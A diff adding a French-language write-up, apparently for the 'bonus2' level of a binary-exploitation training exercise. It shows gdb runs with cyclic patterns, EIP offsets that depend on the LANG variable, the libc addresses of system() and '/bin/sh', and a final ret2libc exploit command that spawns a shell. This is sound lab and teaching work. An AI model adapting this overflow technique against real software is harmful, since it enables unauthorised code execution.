@@ -1,1 +1,60 @@
-Avec gdb, on peut voir qu'il y a 
+On a 2 fonctions, la fonction main et la fonction greetuser
+
+La fonction main va récupérer la variable d'env "LANG".
+On va s'intéresser à cela.
+
+gdb bonus2
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08004141 in ?? ()
+
+On en conclu donc qu'il y a un overflow possible à faire sur notre seconde string en ayant préalablement rempli le buffer de la première string.
+
+On a donc bien un segfault, mais pas assez long pour overwrite l'EIP.
+Pour cela, on peut essayer de changer la variable d'env LANG pour utiliser la string en fi qui est plus longue.
+
+export LANG=fi
+gdb bonus2
+(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41366141 in ?? ()
+
+On a un offset au byte 18.
+
+On peut tester avec la variable d'env LANG égale à nl
+
+export LANG=nl
+gdb bonus2
+(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x38614137 in ?? ()
+
+on a un offset au byte 23.
+
+
+On peut donc essayer d'utiliser LANG=fi ou LANG=nl qui nous permet donc d'ecrire sur l'EIP.
+
+(gdb) info function system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xb7e6b060  __libc_system
+0xb7e6b060  system
+0xb7f49550  svcerr_systemerr
+
+adresse system: 0xb7e6b060
+
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found.
+
+adresse /bin/sh: 0xb7f8cc58
+
+On peut donc créer notre exploit avec toutes ces informations.
+
+export LANG=fi
+./bonus2 `python -c 'print "A"*40'` `python -c 'print "A"*18 + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7"'`
